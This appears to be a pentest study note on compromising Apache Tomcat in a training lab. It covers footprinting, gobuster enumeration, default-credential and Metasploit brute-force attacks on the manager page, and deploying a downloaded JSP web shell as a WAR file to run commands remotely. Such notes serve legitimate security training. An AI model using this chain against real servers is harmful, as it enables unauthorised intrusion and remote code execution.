> Open-source web server that hosts applications written in Java

- Less apt to be exposed to the internet.
- Can make for an excellent foothold into the internal network.

## Discovery / Footprinting
- If the server is operating behind a `reverse proxy`, requesting an invalid page should reveal the server and version.
- Another method is through `/docs` page : 
admin-gui```python
curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat
```

## Enumeration
- Look for known vulnerabilities for the specific version number.
- If none we'll typically look for `/manager` and `/host-manager` pages.
```python
gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
```
- Try weak credentials like t`omcat:tomcat`, `admin:admin` ect.
- We can also try login bruteforce.

## Attacking Tomcat
- We can use the metasploit module for performing the bruteforce attack against tomcat manager :

```python
set VHOST web01.inlanefreight.local
set RPORT 8180
set stop_on_success true
set rhosts <ip>
```

- If we are able to login, we can upload a  [Web Application Resource or Web Application ARchive (WAR)](https://en.wikipedia.org/wiki/WAR_\(file_format\)#:~:text=In%20software%20engineering%2C%20a%20WAR,that%20together%20constitute%20a%20web) file containing a JSP web shell and obtain remote code execution on the Tomcat server.
```python
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp
```
- Then Click on `Browse` to select the .war file and then click on `Deploy`.

- Then browse to http://web01.inlanefreight.local:8180/backup/cmd.jsp

```python
curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
```
